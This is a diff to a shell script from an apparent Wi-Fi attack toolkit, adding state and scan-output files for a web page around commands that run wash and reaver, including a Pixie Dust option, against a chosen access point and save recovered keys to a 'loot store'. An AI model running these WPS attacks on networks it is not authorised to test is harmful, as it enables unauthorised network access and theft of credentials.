@@ -1975,6 +1975,16 @@ wps_restore() {
     fi
 }
 
+# Record the WPS state (idle|scanning|attacking <bssid>) for the web page. The
+# dir is world-readable so the pi daemon can read it; the files never hold a
+# secret (recovered keys go to the loot store).
+wps_set_state() {
+    mkdir -p "$PWN_WPS_DIR" 2>/dev/null || true
+    chmod 0755 "$PWN_WPS_DIR" 2>/dev/null || true
+    printf '%s\n' "$*" > "$PWN_WPS_DIR/state" 2>/dev/null || true
+    chmod 0644 "$PWN_WPS_DIR/state" 2>/dev/null || true
+}
+
 cmd_wps_scan() {
     need_root
     command -v wash >/dev/null 2>&1 || die "wash not installed (part of reaver)"
@@ -1984,9 +1994,13 @@ cmd_wps_scan() {
         case "$1" in --seconds) seconds=$2; shift 2 ;; *) die "unknown option: $1" ;; esac
     done
     iface=$(wps_setup_iface)
+    wps_set_state scanning
     log "scanning for WPS-enabled APs on $iface for ${seconds}s..."
-    timeout "$seconds" wash -i "$iface" || true
+    # Capture the results for the web page as well as the console.
+    timeout "$seconds" wash -i "$iface" 2>&1 | tee "$PWN_WPS_DIR/scan.txt" || true
+    chmod 0644 "$PWN_WPS_DIR/scan.txt" 2>/dev/null || true
     wps_restore "$iface"
+    wps_set_state idle
 }
 
 cmd_wps_attack() {
@@ -2008,6 +2022,7 @@ cmd_wps_attack() {
     valid_mac "$bssid" || die "not a BSSID: $bssid"
     capture_ack "$yes" || { log "not acknowledged; aborting"; return 1; }
     iface=$(wps_setup_iface)
+    wps_set_state "attacking $bssid"
     local args=(-i "$iface" -b "$bssid" -vv)
     [ -n "$channel" ] && args+=(-c "$channel")
     [ "$pixie" = true ] && args+=(-K 1)
@@ -2015,6 +2030,7 @@ cmd_wps_attack() {
     out=$(reaver "${args[@]}" 2>&1) || true
     printf '%s\n' "$out"
     wps_restore "$iface"
+    wps_set_state idle
     # Parse + record to the loot store as pi (it owns the store).
     PWN_OUT="$out" PWN_BSSID="$bssid" run_as_pi "$PWN_VENV_PYTHON" -I -c '
 import os
